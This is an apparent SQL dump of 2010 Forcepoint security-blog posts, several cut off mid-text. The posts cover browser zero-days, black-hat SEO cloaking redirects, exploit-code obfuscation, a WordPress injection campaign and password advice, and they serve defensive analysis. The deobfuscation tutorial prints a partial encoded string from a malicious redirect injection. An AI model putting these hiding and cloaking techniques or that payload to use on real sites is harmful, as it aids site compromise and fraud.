This is Charlie Miller\'s hat trick.\n5. Mozilla Firefox had a vulnerability exploited with a drive-by download. ASLR and DEP on Windows 7 were bypassed.\n\n  In other news, the Sougou BBS Web site was compromised and injected with a malicious iframe. Searching for Corey Haim on Google led to malicious rogue AV Web sites, as did searching for other blackhat SEO poisoned terms like March Madness, and various sensational topics and events.\nWeb 2 dot uh oh\nLast month, we detected that over a quarter million malicious links were posted on various Facebook pages, including those belonging to celebrities like Justin Timberlake. In the blog post, we include a video showing just how quickly the links are spreading. (Note: be careful what you click on!) Websense Security Labs has also been monitoring the latest WordPress attack that saw over 250,000 injections over a span of just 2 weeks\n\nBrowser and friends\nIs the fully-patched browser safe? Look at the Vancouver Pwn20wn 2010 contest. Fully-patched IE8, Safari, and Firefox have been hacked. The good news is that the zero-day vulnerabilities the hacker used are not spreading in the wild. This will help the browser vendors to complete their products. Apple released security update 4.0.5 for Safari, patching 16 vulnerabilities. Mozilla has also done a lot of work this month, releasing Firefox 3.6.2, which fixed 15 vulnerabilities. Opera released 10.51 for windows with two vulnerabilities patched. According to F-Secure\'s research, PDF-based targeted attacks have been increasing in the past few years, reaching 61.2% in 2010. A good example of this type of attack is a campaign related to FIFA World Cup 2010 theme that has spread in the wild in March. Victims receive an email containing a PDF that exploits CVE-2010-0188, though the vulnerability was back in February.  \nMicrosoft\nMarch brought two new Internet Explorer zero-days, one requiring an emergency out-of-band patch and one still unpatched.  The first is a vulnerability in Internet Explorer (CVE-2010-0483) that gives attackers remote code execution capabilities on the machines of IE users who are tricked into pressing the F1 key for help.  The attack involves specially-crafted VBScript and Windows Help Files for IE. While POC code has been released detailing the exploit, no attacks have yet been seen in the wild.  Microsoft plans to release a patch for this bug in April. \n  While the F1 zero-day vulnerability wasn\'t addressed, March\'s Patch Tuesday did include 2 important remote code execution bulletins.  MS10-016 addresses versions of Windows Movie Maker that ship with Windows XP and Windows Vista, and involve users opening malicious Movie Maker files.  The second bulletin MS10-017 patches all currently supported versions of Microsoft Excel, both on Windows and Mac to protect against attackers convincing users to open a malicious Excel document to exploit their machines. \n  The biggest Internet Explorer news this month was a zero-day vulnerability (CVE-2010-0806) involving a use-after-free bug in the Peer Objects component (iepeers.dll) in IE6 and IE7. Microsoft released an advisory providing mitigation options, emphasizing that IE5 and IE8 are unaffected, and stating that they had seen limited targeted attacks in the wild.  An Israeli researcher released working exploit code for the vulnerability, and integrated it into the Metasploit Framework.  Microsoftreleased a quick-fix that disabled the offending component, but was forced to release an out-of-band patch for the actively-exploited vulnerability on March 30. You can find more details about this vulnerability in our detailed analysis of the exploit code found in the wild.  \nHello ThreatSeeker, you\'ve got mail!\nThis past month has seen some diversification of social engineering in malicious spam. Spammers have abused big brand names to entice possible victims into clicking on URLs in messages. One such example we alerted on was an Apple App Store campaign. With this campaign, spammers abused the good reputation of legitimate sites to host their redirects. Compromised sites were linked in Apple App Store spam and would redirect to the final spam site destination. In some cases there were even client side exploits hosted on the redirect sites! Spammers also tried to lure victims by sending fake Skype toolbars for Outlook. \n  A couple of new and interesting spam cases included two countries and a big sporting event. Spammers used scare tacticsas a lure for victims to open malicious ZIP attachments. The emails were spoofed to look as though they were sent from official US intelligence agencies and stated that North Korea had launched a missile at Japan. Riding on the PDF infection train, spammers also sent out targeted attacks containing infectious PDF files. The attacks consisted of FIFA World Cup themed messages with a PDF attachment. These attachments were laced with exploits intended to compromise the end user\'s computer. \n   \n   \n   \nSecurity trends\nBeyondTrust collected data from Microsoft Security Bulletins published throughout 2009 and released a report pointing out that  64% of all the reported Microsoft vulnerabilities for 2009 could have been mitigated by using the principle of the least privileged accounts.\n  By staying well under the radar (unlike obvious and annoying adware) malware writers can now build a residual income stream via our everyday surfing and shopping online. A malware industry chain has formed that extends from malware programming to malware distribution.\n  A representative from the Russian Association of Electronic Communications (RAEC) admitted that, based on their recently released study, not only are seven of world’s top ten spammers Russians, but also that the world’s number one spammer is a Russian who lives in Moscow.\n  A Google security researcher \"SkyLined\" has released  an exploit that uses the ret-into-libc technique to bypass DEP and launch code execution attacks on x86 platforms.\n  Hackers using the Metasploit point-and-click attack tool can locate and exploit the backdoor Trojan that was recently found in the software included with the Energizer DUO USB battery charger.\n  An innocuous weather application was used to commandeer about 8,000 iPhones and Android devices in a mobile botnet by a pair of security researchers.\n\n  Thanks to the following contributors for this month\'s roundup:\n  - Erik Buchanan (Security & Technology Research)\n  - Lei Li (Security & Technology Research) \n  - Ulysses Wang (Security & Technology Research) \n  - Jay Liew (Security & Technology Research) \n  - Chris Astacio (Security & Technology Research) \n  - Ivan Sabo (Security & Technology Research)', 'https://www.forcepoint.com/blog/security-labs/month-threat-webscape-march-2010\n');

To increase the rating of the newly-created fake medical or rogue AV Web site, criminals sharpen their skills in Black Hat SEO (search engine optimization). While White Hat SEO is basically being used by all businesses as well as other non-profit sites, Black Hat SEO poisoning is mostly used for sites that do not want to build their traffic and popularity in a natural way. In some ways Black Hat SEO is a kind of celebrity life – popularity can be on the rise in a couple of weeks or even days and then abandoned just as quickly.\n\n\n\nIn both cases, this short popularity span can bring enough attention or revenue so that it\'s not in vain. Search engines like Google, Yahoo, or Yandex invent new solutions every day to filter sites using Black Hat techniques and not allow them to achieve their aim – which is to be seen on the first pages of search engine results when people are looking for genuine information.\nIf such sites manage to reach top search result positions, the traffic generated by people visiting the Web site will rapidly increase. It is worthwhile for Black Hat SEO teams, even with the risks of being shut down, because of the immediate visibility that their site gets - their 15 minutes of fame. This is another similarity to a celebrity\'s life: to be banned only once means they will never be highly rated again. The popularity can be built fast, and destroyed even faster.\nThere are many common techniques used in Black Hat SEO which lead to more or less the same target. It all depends on the time available, the ability to take a risk, and of course, money.\n\nBacklinks – the most common and popular technique. It is not important how many links you point at, but how many links point to you. It\'s even better if the links are bidirectional, which is of course more difficult to achieve. Therefore \"link farms\" became a popular service not long ago, offering many servers pointing to one specific site or pointing to each other to build inter-linking. This approach has quickly been discovered and cracked down on pretty well by companies like Google, Yahoo, and others. So Black Hat guys started to infect pages through mass injections or other malicious means to get such links working in invisible form (hidden links) or in a pretty visible way, automatically populating forums, blogs, and directories. Of course, not every link has the same weight. There is a difference if a description of a link says \"Go here\" and points to \"Quality meds\", compared to a precise description. Also, links coming from high-ranked sites are weighted much more.\n\nUsing a high-ranked domain (for example, YouTube) to propagate such products and services. Especially, accounts that have existed for a long time are much more likely to get better visibility.\n\nImage Crafting – every search engine advances some kind of a picture property. There are different approaches depending on the size, location, \"href\" description, and \"alt\" description of a picture. Using the right properties makes some pictures more easily visible than others.\n\nCloaking – content presented to search engine crawlers is different than content presented to a user’s browser. This kind of \"hiding\" offers special protection against being noticed and banned.\n\n\"Bait and Switch\" – this technique is used to get high ranking usually using white methods, and subsequently switching the content from legitimate to something completely different. Even though nowadays this method is almost useless as search engines are parsing Web sites on a daily basis and notice switching immediately, sometimes a couple of hours is more than enough for criminals to achieve their aims.\n\nMicroblogging is becoming more popular every day. Pages offering microblogs are getting high ranking very quickly and this ranking is automatically passed to all blog posts. One of many techniques abusing such sites is registering an account into many highly popular groups and slowly posting messages with “appropriate” words, or even better URL links to all of them. These messages get attention at once when posted, due to the fast and privileged indexing of such sites by search engines. Hence all of these crafted microblogs influence query results in a couple of hours.\n\n301/302 redirect (also known as Get Your Traffic Now). Recently we posted an alert about Bloombox SEO poisoning – we have started to see more and more abuse of this technique. Let\'s have a look.\n\nScreenshot 1 – Bloombox Black Hat SEO\n\nUsually the abuse is achieved through a PHP file installed on a compromised host. The file keeps a parameter of the search term, in this case \"bloombox\". The search term is usually a word or a phrase used by customers to find information about a particular event. When they follow the link, the user is being redirected to a Web site with rogue AV.\nScreenshot 2 – Rogue AV trap presented as a “Bloombox” destination\n\nWhen trying to access the same link not from a Google search page but by directly pasting the URL into a browser, the user is redirected to http://www.cnn.com.\nScreenshot 3 – Imitation of direct input of URL into a browser\n\n\nThe same thing happens when using a Google Bot referrer, pretending to be a Google crawler.\n\nScreenshot 4 – Imitation of Google Bot parsing the page\n\nThe next step shows the case when the user gets access to the page from a Google search page.\nScreenshot 5 – Imitation of accessing the page from Google search.\n\nThis site can be accessed only from a Google search page and only by a user. The whole trick is being done by a PHP file uploaded to a compromised host carrying the 302 (Temporary redirect) or 301 (Permanent redirect) with the cloaking mechanism. The redirection to an appropriate location depends on who or what follows the link.\nSuch PHP sites will work for any Black Hat SEO hot topics, as any parameter (search term) being passed to the PHP site will work in exactly the same way.\nAs major events reach the news and articles are being posted, that\'s where the search terms are being taken from. Also, all the pages redirecting to these high-ranked sites (especially using a 301 or 302 redirect) automatically start to get higher ranking.\nMost of the times Black Hat guys compromise hosts with a good \"Google reputation\", so once the PHP file is uploaded and \"glued\" to a news site, it\'s only a short time before they will be seen in the top search results.\nOf course, Google and other search sites know about these techniques and do their best to block Black Hat activities. However, as always this is the thin end of the wedge. Cybercriminals compromise as many legitimate sites as possible and just wait for a major event to use. They have no fear of being banned or delisted – they never use their own domains. In a few hours, compromised sites get a high page rank and will stay at the top for several hours, which is enough time for them to get good traffic into their rogue AV or other “chunky” goods sites.\nUnfortunately, this is a mere short list of many popular and highly used activities used by bad guys. When companies like Google or Yahoo patch one hole, the Black Hats find a new one in literally a matter of minutes. As we wrote at the beginning, Black Hat SEO is like a celebrity life - an easy and fast rise to fame, and very short lived. Do not be optimistic though. There are always thousands of others having “great ideas” and waiting to take a place in the front row of this show.\n\nSecurity Researchers: Artem Gololobov, Ivan Sabo', 'https://www.forcepoint.com/blog/security-labs/celebrity-life-black-hat-seo\n');

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (834, 'Malicious Code Evolution from IE Zero-Day Exploit Code', 'Tim XiaJohn BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'Internet Explorer zero-day exploits are not new to the world: we have been suffering from them since the beginning of IE. This latest IE zero-day exploit, known as CVE-2010-0806, as usual is no surprise, but we can\'t help noticing that something behind it has changed. Just a week after the exploit code was exposed to the world we have seen many variants come out. Based on the records from the Websense® Security Labs™ ThreatSeeker™ Network, we are setting out the evolution history of the exploit code.\n\nWe know that every security company tries to detect exploits, and malware authors try their best to avoid it. Code evasion is the key point in this endless war, and the following 3 aspects are what hackers like most and are still focused on:\n\n \n\nCore Code Obfuscation\nCore code is the core of the malicious code, where the main purpose of the attack resides. Typically it is a piece of shellcode which will download and execute remote files after successful exploitation. By obfuscating core code, the real intent of hackers is hidden right in front of your face.\n\n \n\nAlgorithm Code Obfuscation\nAlgorithm code is the helper part to ensure that core code executes. Actually algorithm code is the pick of the basket in the whole exploit code and people will pay large amounts to get it. Normally it is some JavaScript code to set up the exploitable environments. Hackers may encrypt this part to make their code less fingerprinted and hence avoid detection.\n\n \n\nCode Position Obfuscation\nWhen checking for malicious code, people often first try searching the code in script and iframe tags, which is where malicious code usually resides. However, other HTML tags are also a good place to embed bad code. Typically hackers choose P and DIV tags as their first choices; sometimes they change their taste to use INPUT and TEXTAREA tags. Another common way to hide code is code fragmentation, which is putting the malcode in separate files; of course the reason for this is to avoid detection.\n\nIn this latest IE zero-day attack, malware authors have so far made many different versions based on the original one. Let\'s take a look at them, from easy to difficult. The first snapshot below shows literal core code and algorithm in normal script tags. \n\n \n\n\n\nThe code above is very easy to read and understand, so some people might not be satisfied with this. Hence they obfuscate the core code a little bit and the algorithm code slightly, but it is still readable. You may or may not be familiar with this trick, but we have come across it a lot - refer to Gumblar for more details. This kind of obfuscation could be done in various ways and we have quite a few examples; this blog includes 2 easy cases so you can see what they look like. \n\n\n\n\n\nUp to now, we can easily understand what the core code will do, but some hide-and-seek-loving people have introduced a new way to make things more complicated. They put the malcode in a separate file or even many files, so people might not notice it at all, let alone read or understand it. \n\n\n\n\n\n\n\n\n\nThe next snapshot shows that hackers are still using the hide-and-seek tricks, but moving the obfuscated core code to HTML tags. \n\n\n\nSome very simple tricks are applied in the following case: all function and variable names are randomized, making the whole code appear unreadable. \n\n\n\nFinally, in this example the algorithm is obfuscated which makes it even harder to read. It looks complicated, right? You will never know what the real content is unless you decode it completely. However, this is still not the worst case we have encountered. The Beladen attack that happened last June has shown us how this kind of trick could be improved, and a multilayer obfuscation we have found almost brought despair to people who love manual deobfuscation. \n\n\n\n \n\nSo we have seen many obfuscation techniques so far, but it is not a problem to us since we luckily have our super tool Gustav to help. Gustav simulates the execution of inputted HTML and JavaScript code and outputs the final code to us, saving a lot of time in the process. We will introduce more details about Gustav later.\n\nSecurity Researcher: Tim Xia', 'https://www.forcepoint.com/blog/security-labs/malicious-code-evolution-ie-zero-day-exploit-code\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (835, 'How To Speak Malicious', 'Forcepoint Security LabsJohn BergbomForcepoint Sec', '\n      \n    \n      \n      \n   ', 'In this blog post, I want to cover a specific type of code obfuscation and then demonstrate how to manually, step-by-step deobfuscate the code. There are many automated tools and methods for performing deobfuscation, but I feel it\'s important to get down to the attacker\'s level to gain a more intimate understanding of attackers and obfuscation algorithms. This understanding helps us create better signatures to identify malicious content with our Threatseeker Network. After all, the best way to protect yourself and others from attack is to understand your attacker so that you have a better chance at proactive protection. Now, on to an example of obfuscated attack code. \nIt\'s important to note that sites that have this code are most likely legitimate sites that have fallen prey to malicious code injection. This means that the site has been compromised by an attacker. The attacker inserts malicious code onto the compromised site and the injected malicious code executes when visitors visit the site. The attack code can either be on the compromised site or on another site to which the injected code redirects the visitor. We can think of the injected site as a vehicle for getting the attack code to run on victim computers. Below is a screenshot of the injected code that we\'re going to study. \nInjected code on an innocent site: \n\nFor most people who see this malicious code, their eyes go crossed and they have no idea what they are looking at. This is the attacker\'s intent. Attackers don\'t want anybody viewing the source of the page to recognize that their injected code is doing something bad. So our first step is to format this script code so that it\'s easier for our eyes and brains to handle. You\'ll want to grab the code, put it into your favorite text editor and format it so that it looks like actual code. When that\'s done, you should feel that the code is easier to read and much less intimidating to review. \nHere is the code copied from the source of the page and formatted: \n\nNow that the code is nicely formatted, we can see that there are a number of function definitions in the script. In each of the function definitions we can see a variable declared with a peculiar string of numbers in a specific pattern. We can also see that this variable seems to be followed by a for loop. The for loop attracts my eyes straight away. Typically, a for loop that follows a peculiar variable definition is a red flag for a deobfuscation routine. For the rest of this post, we\'ll focus on one of the function definitions. \nHere is the function definition we are going to work with: \n\nLooking at this function, there is further work that we can do to make things easier for our eyes and brains. First, notice that the variable names are random and not meaningful. This, again, is designed to throw us off from understanding what is going on. But we are tenacious and not about to give up. So the next thing to do is to review the variable names, including where and how they are used. If there are variables that are static throughout, then let\'s do simple search and replace for the variable names. In this case, we can do a search and replace for CcySlu=4 and vcN=5. \nWe should also look for any places where function declarations are used in a similar way. For example functionXKJepVPIJ(c) is simply returning the string representation for a character code that is passed in. So anywhere we see a call to XKJepVPIJ, we can replace it with String.fromCharCode. Finally, in this step let\'s perform any mathematical operations in the function, so that we are left with a single number instead of a series of numbers and operations that we would have to think about every time we come across them in a loop. \nHere\'s a look at the function after performing the above steps: \n\nThis function still looks intimidating, but less so because we can now recognize that the for loop is going backwards instead of from 0 to the end of a string or array. This is probably another ploy to throw off static analysis. We also have static values to work with instead of randomized variable names, so we can begin to see simple math operations and simple function calls. With respect to function calls, I\'m no javascript developer so I don\'t know and recognize all the javascript functions that I come across. In this case, I was unfamiliar with the parseInt function and that threw me for a bit of a curve at first. \nSo I pulled out my local library card and hopped on my bike to do some research. Actually, that was a middle school flashback -- I\'m showing my age here! I simply did a Google search for the parseInt function to learn what it does. According to my research, parseInt basically gives me the decimal value of what is passed in. Because there is no second value passed into any use of parseInt in our function, the use of the parseInt function is not necessary. So we can remove the parseInt calls. After parseInt is removed, we can rename some of the random variable names to some friendlier looking names and we\'re left with some readable code to step through. \nThis is the final resulting code. It\'s much easier to get my head around. I\'ve also put a few comments inline: \n\nFor those of you wishing to try and step through this: \nvar string=\'122-2+166-2+153-3+165-3+158-2+164-0+167-1+124-0+167-1+163-1+164-0+111-1+\n  160-4+163-1+153-3+152-0+167-1+158-2+163-1+162-2+123-1+105-3+157-3+167-1+167-1+\n  164-0+120-4+112-0+112-0+165-3+\'; \nNow that this first function has been decoded, remember that there were multiple function definitions in this script injection. You should begin to see a script redirection created by the injected code. This script redirects visitors to an attack site while they are visiting the original site, which was injected with the above obfuscated code. As you can see, there was a lot of work done to hide the intent of the injected code. This obfuscation work is an attempt to evade recognition and removal of the injected code from a legitimate site. By understanding the deobfuscation process, we can generate more generic signatures that will help identify variations of this script injection. \nSecurity Researcher: Chris Astacio', 'https://www.forcepoint.com/blog/security-labs/how-speak-malicious\n');

Barely two days after the launch, there was evidence that spammers had already latched on to this new medium for sharing information.\n  A rogue Facebook app with a \"viral marketing\" component was discovered, where users are enticed into clicking a link titled \"Who is seeing your profile?\" The user is then led to through a series of step-by-step instructions to help propagate the app, without realizing what they are actually doing.Thousands of Twitter users fell for a phishing attack, including some notable victims from the UK, such as the Press Complaints Commission, a BBC correspondent, the Guardian\'s head of audio, the UK\'s environment minister, and even a bank.\nBrowser and friends\nAdobe still fights against the vulnerabilities in their products. In February, Adobe delivered a security update for Adobe Flash Player. Two vulnerabilities have been fixed, including a critical one (CVE-2010-0186) that could subvert the domain sandbox and make unauthorized cross-domain requests. Also, an out-of-band security update for Adobe Reader and Acrobat has been released, ahead of the company\'s usual patch schedule. Two critical vulnerabilities were patched, including CVE-2010-0186 (just mentioned). Lastly, a critical vulnerability in Adobe Download Manager has been patched. This one could potentially allow an attacker to download and install unauthorized software onto a user\'s system.\n  Adobe\'s products were targeted most in 2009 according to Scansafe\'s report. Malicious PDF files comprised 56% of exploits in Q1 2009, growing to 80% by Q4 2009, while Flash exploits dropped from 40% to 18%. The fact that over 90% of PCs install Adobe products, and that most of the product versions are outdated, may be one reason why Adobe is the most targeted by attackers.\n  Mozilla has removed two experimental Firefox add-ons that turn out to contain a Trojan: Version 4.0 of Sothink Web Video Downloader, and all versions of Master Filer. But there have already been more than 4000 downloads of each. Mozilla released fixes for five security holes, including three critical vulnerabilities.\nMicrosoft\nA Blackhat DC Presentation demonstrated a data leakage vulnerability that allows an attacker to read any file on a default installation of Internet Explorer on Windows XP (see MS advisory). As we reported, Microsoft\'s Ninemsn Australia site was compromised by Gumblar, adding to this month\'s web problems for Microsoft.\nThis month\'s Patch Tuesday was another big one, with 13 security bulletins addressing 26 vulnerabilities.

However, we found a twist in this month\'s spam. Attackers seem to have used Zeus kits to target government and military personnel in the US and UK. One campaign pretended to be from the National Intelligence Council. It enticed victims to download a document about the \"2020 project\". Another targeted CIA personnel, luring them to download a Windows \"update\" against an attack. In both cases, victims who fell for the trap found their machines infected with the Zeus malware.\n  In other news, we also saw an interesting malicious campaign against all you Google fans who have applied for employment with the company.\nSecurity Trends\nApple has fixed five documented vulnerabilities in iPhone OS 3.1.3 and iPhone OS 3.1.3 for iPod touch.

No matter how frustrated or disappointed the bloggers are, attacks still continue. If you search \"my blog was hacked\" on Google, you get 4,230,000 results; searching \"my blog was hacked again\" returns 2,380,000 matches, and the number keeps increasing daily. What we can see from the these rough stats? Apparently nearly 44% of attacked blogs are lucky and aren\'t attacked again, but over 56% of attacked blogs repeat the previous nightmare.\nSo why does this happen? There are several reasons, but the one we should absolutely never ignore is the vulnerabilities of blog platforms themselves. According to the following Open Source CMS Market Share Report 2009,WordPress, which has the most downloads among all competitors, is dominating today\'s market along with Joomla! and Drupal. Therefore, we have used WordPress for our research.  \n  Websense® Security Labs™ ThreatSeeker™ Network has been monitoring the latest WordPress injection attack for over 2 weeks and has found over 250,000 injections occurring in the past half month. Moreover, over 37,000 URLs in the wild are still being injected according to our observations. As the following chart shows, the daily stats go up and down a few times and always end up higher, so we believe the hackers are still continuing their attack.  \n  WordPress is so widely used all over the world that every version of it is studied and exploited by hackers, even the latest version (2.9.2, released on December 18, 2009). The following chart reveals the percentage split of different WordPress releases affected in this attack.  \n  The following obfuscated malicious code snapshot shows what the injection looks like. The ultimate purpose of the attack is all about making money, as Sophos has already investigated.  \n  These attacks probably happened due to SQL injection via some known and unknown WordPress vulnerabilities. SecuriTeam maintains a list of 23 known WordPress vulnerabilities, and if you search on milw0rm.com, you get almost 60 results. This means that 60 different vulnerabilities have been discovered to exist in different versions of WordPress.  \n  Injection is not the only way for hackers to utilize those vulnerabilities; compromising a site is also a good option. It has often been reported that compromised Web sites are used for Blackhat SEO to push rogue AVs. Novirusthanks has a great analysis here, and more investigation indicates that the compromise behind the attack is connected to WordPress vulnerabilities.  \n  WordPress users should be very familiar with the injection or compromise attack since it has been used frequently in the past. Although WordPress has 2-3 releases every year and has 3 releases planned this year as usual, it has proved to be not enough: we still can see many victimized sites with the latest 2.9.2 installation. However, without the help from WordPress developers, there are still some measures we can take to harden our blogs. In addition, some WordPress plugins are also very helpful. Typically, bloggers choose WP Security Scan for vulnerability checks and WordPress Exploit Scanner for injection checks. Moreover, when attacks really happen, don\'t panic: a great guide is already there to help you clear up the mess. \n  Websense Messaging and Websense Web Security customers are protected against this attack. Security Researcher: Elson Lai, Tim Xia', 'https://www.forcepoint.com/blog/security-labs/wordpress-injection-attack\n');

I have to personally thank Wladimir Palant, who you should know from his development effort on a plugin called AdBlock plus. Wladimir was instrumental in offering tips to Firefox plugin writing. Thanks Wladimir!\nEssentially FireShark is a local plugin that, when used in a clustering architecture, can become a very powerful mechanism in visualizing the malicious Web. In my presentation, I shared several real-life scenarios of compromised Web sites. On one occasion, FireShark mapped out one particular malicious community that later, when operation b49 was exposed, uncovered that many of the hosts involved were also Waledac spamming domains. FireShark made it easy to see that these domains were responsible for acting as control points, redirecting users from legitimate compromised Web sites to landing pages serving rogue antivirus. More so, FireShark\'s post processing mechanism could conduct analysis on compromised machines, intermediary machines and the final landing pages, so that not one piece of information was left unknown. This includes the original source code, the de-obfuscated source code (final DOM view), and any window prompt or malware that the user is optionally asked to download and install. This is useful for one Web site, but FireShark does this for millions of sites every day. By correlating all the data, FireShark is able to take the normalized data and link various previously assumed unrelated attacks.\n \n  Figure 3: A Web site that was compromised and part of a small malicious community, graphed with GraphViz from FireShark output\n \n  Figure 4: Stephan Chenette (me) speaking at RSA\nI sat down with Rob Lemos in an interview while at RSA; so if you\'re interested in knowing more about FireShark until it\'s released, you can read the article here.\nDays before my presentation, Dan Hubbard co-presented with researchers from ZScaler outlining some of the current top cloud computing threats.

Black hats keep focusing on collecting passwords in many different ways. Instead of breaking the computer security system or brute-forcing pass phrases, they use a variety of easier techniques to get our credentials. The ways they make us give up sensitive information include setting up fake mailing lists, forums, and social network sites to harvest logon details. Then, using this information there is a good chance that the attacker can sign in to valuable sites like social networks or even online banks with the same user name and password.\n\n\n	\n\n\n	Four months ago we highlighted this problem in a blog. The main concern stems from the fact that most people are using the same user name and password pair on many different sites. The reason behind this is very simple: nowadays we need to pass too many authentication protocols, and it is very hard to keep remembering all of those credentials. Later on we will show some alternative methods for creating and managing passwords.\n\n\n	Because of this fact, a fake site could act as a legitimate user forum or Web 2.0 site, which requires a user to be registered before making a post. When the user registers, the hacker immediately has access to all the necessary information needed for the attack: the user name and the matching password. Also, the criminal can collect other information like the IP address the user originated from, his or her email address, gender, age and so on. From the email address for example, a hacker can guess the mail server and can possibly access it with the given password. One of the obvious purposes of this is that malware can be harvested through email or a spam campaign. Even further, this bad guy could try to use the same credentials all over many well-known sites like Facebook, MySpace or Twitter. In the worst case, they can even log in to online banks which then allows them to steal money as suggested in the Trusteer\'s Security Advisory.\n\n\n	There is nothing new about this type of fraud, really: similar techniques have been used for the last decade for stealing credit card numbers. However, there is a distinct difference between bank cards and passwords: we cannot change the number on the plastic card, but we could use a unique password for each site - so the real question is, is it actually our fault if someone gains an advantage because of our laziness?\n\n\n	The above example clearly shows the risk we take when signing up to a new site. So what, you might ask: I never visit malicious sites. Here is another scenario then. You visit a site for years and you are certain that the company behind the site is legitimate. Unfortunately many Web sites store passwords in an unencrypted form. An attacker therefore has a chance to steal your password even if they do not know anything about you. Just three months ago, the social network site RockYou was compromised and over32 million user accounts were stolen as they were stored in clear text. These passwords could be used on other sites as well, thanks to the bad habit we have of using the same password.\n\n\n	Phish and chips\n\n\n	The figures show how high the value of the problem is, and this is only a small part of the overall picture. Another favorite technique is the phishing campaign, which Websense has seen in high volume for years. This is another well-known technique to trick unaware users into giving away their secrets. This could be done by sending an email that seems to be from a legitimate company or organization. The fake contents vary, and sometimes it it really difficult to spot the difference between the valid and the phishing mail, even for an experienced user. It can be a malicious link that looks normal, suggesting that the user should log in to the site; or asking for a password reset due to various issues; it can also be an attachment that contains a password stealing trojan. If there is an email in your inbox asking for a password, a big red flashing light should remind you about the danger - this is possibly a phishing scam and you should delete the email without even reading it. But if you are expecting that email (for example because you explicitly asked your favorite site to reset your password) then you should not click on any link in the message, but rather copy and paste the link from the message into your browser.\n\n\n	\n\n\n	Secrecy of the secret word\n\n\n	There are many methods out there advising you how to generate a secure password for yourself. Some of them are even fun to apply, like picking your favorite cartoon characters and mixing them together, or taking all the first letters of each word from a sentence that you can remember.\n\n\n	Nice, but are these really secure? To answer to this question we need to raise a couple of other questions: did not we just mention that we must use individual keys for every single site we sign in to? Have not we said that we should change passwords every so often on each of these sites? Then how can we remember tens or hundreds of these cartoon figures or favorite sentences that we used for the generation method?\n\n\n	One possible solution is to use password patterns. This means that we use basically the same pass phrase for every single site, but we insert some alteration into it each time. For example, if the secret word is \"MyP@ssw0rd\", we could use \"MyP@ssG00gl$w0rd\" and \"MyP@ssY$h00w0rd\" for Google and Yahoo respectively. It looks different, it\'s easy to remember, and it seems to solve the problem of using the same passwords on different sites. However, it is quite easy to guess the static and dynamic part of the password, so it does not really harden the authentication. We need to look for another way of generating secure passwords and also something that is possible to remember in the future. There is a type of software that can offer both of these, called password manager.\n\n\n	There are many solutions available for generating and storing our credentials. If you search for the phrase \"password manager\" on the Internet, you will see a huge selection of these. These tools can remove both of the heaviest weights from our shoulders: in a split second, we can have a new and secure password, and also it can be stored in a safely encrypted file. All you need then is to remember one master pass phrase that allows you to access the rest of your passwords. Look at it this way: passwords are just like keys, and a password manager is like a key box. You still need one key that opens up the box, but then you can access all of the keys that you store in it.\n\n\n	Choosing the right tool\n\n\n	Before you select your password manager, check what it offers. First of all, there are two main types you have to choose from: online password managers and local ones. A local one can be used without Internet access, and the secret file is stored on your local hard drive or USB stick. Alternatively, an online version puts all your credentials into a remote server, therefore you are no longer relying on the safety of your local storage. Also, you can access the same online password storage from another place or computer.\n\n\n	There are many discussions about which one is safer. One side says that with an online version you have less control over whoever is accessing your database, and also there is a chance that a hacker could gain illegal access to the password database. Meanwhile, the other side says there is a bigger chance that your laptop will be stolen than an online security site will be compromised. A stolen laptop therefore presents a higher risk with the stored passwords, they say, not to mention the threat of password-stealing trojans. Instead making a judgment on these arguments, we only would like to stress that whatever method you choose is most probably much safer than using weak and/or the same passwords on all forums and Web 2.0 sites.\n\n\n	Many thanks to Ivan Sabo for sharing his idea about this subject.\n\n\n	Security Researcher: Tamas Rudnai', 'https://www.forcepoint.com/blog/security-labs/top-secrets-about-your-passwords\n');

However, it is not hard to foresee through the crystal ball that Dorothy\'s journey along the yellow brick road will be full of constant attacks from the Witch of malware and her spamming monkeys.\nThe biggest problem with Google Buzz is privacy. You can read lots of blogs and articles on this already, and this blog does not intend to examine this subject. It\'s enough to know that with Buzz, it is too easy to follow and read other people\'s messages. What we intend to explain is how Buzz connects different social networks together, creating a super-network.\nWhat is worrying for us is that it\'s now much easier to spread spam and malicious messages than before, thanks to this super-network. Google has reacted to these issues quickly and has changed the default settings of its social network. Unfortunately there is no change for existing users, so if you have already subscribed, you still need to tweak the settings for yourself to make it secure - see below for details of how to do this. Google has also promised a new tab for the Gmail settings screen, to give people better control over their existing account.\n\nPicture 1: The blogspot \"szilvasyz\" is not even mine!\nBut what was wrong, you might ask? As you can read in this alert, just two days after Buzz became available to the crowd, spammers started to use it for their unwanted mail marketing. I expect our ThreatSeeker™ Network to detect more threats like this in the near future. Were you surprised how quickly spammers just jumped into this platform? The reason is simple: not only were Buzz users able to build up an audience in an uncontrolled way, but they could also attach other Web sites to their Buzz accounts. In fact, some of these external sources were already attached to users\' Buzz accounts by default. This is what Google has realized and corrected - however, people who have already subscribed are still vulnerable.\nWhat does it mean? If you have a Google Reader account, then your public posts and shared items are automatically displayed in Buzz. Similar to this, Picasa also shares public photos to Buzz by default. Further, you can manually set up virtually any unrelated public posts in your account. This means whenever you post a message on an application such as Twitter, Flickr, or Blogspot, the same message appears in your Buzz account as well. If this isn\'t eyebrow-raising enough already, here is the next privacy issue: you can even attach someone else\'s Twitter or Flickr account to your Buzz. This latter issue opens many security and privacy related questions.\n\nPicture 2: This is a typical scenario of what Google Buzz does in the real world\nHow can Buzz be made more secure? As mentioned above, Google has already made changes to the default settings. However, existing users are still suffering from these privacy and security issues. To make your Buzz account safer, you need to tweak the settings manually.\nWhen you open your Buzz window, you can see a row of links on the top of the page containing your name, an Edit function, connected sites, and followers. The first thing you need to do is click the Edit link:\n\nPicture 3: Click Edit to set up your profile\nOn the setup screen, make sure you clear the boxes marked with red in the picture below. The most important one is Display the list of people I\'m following and people following me - as this means everyone can see who you are following. In the early Buzz defaults, someone could even track down your mailing partners as Buzz was automatically following your most frequent mail buddies. Also it is recommended that you never put personal information on social networking sites (and in general on any sites) as that information could be used for social engineering.\n\nPicture 4: Clear these boxes\nThe next step is to click the connected sites link, to see which sites are sharing information with your Buzz account. You can see that the dialog box is similar to the one in Picture 1. Make sure you remove sites you do not want to share with Buzz buddies. For example, my Picasa and Google Reader were connected automatically with the early default settings, so I had to remove the connections manually. To do this, click on Edit, then Remove site.\n\nPicture 5: Remove unwanted connections\nThe final step is to review all the people following you and those you follow already. Just click the Followers link at the top of the Buzz page, and click Unfollow next to whoever you do not wish 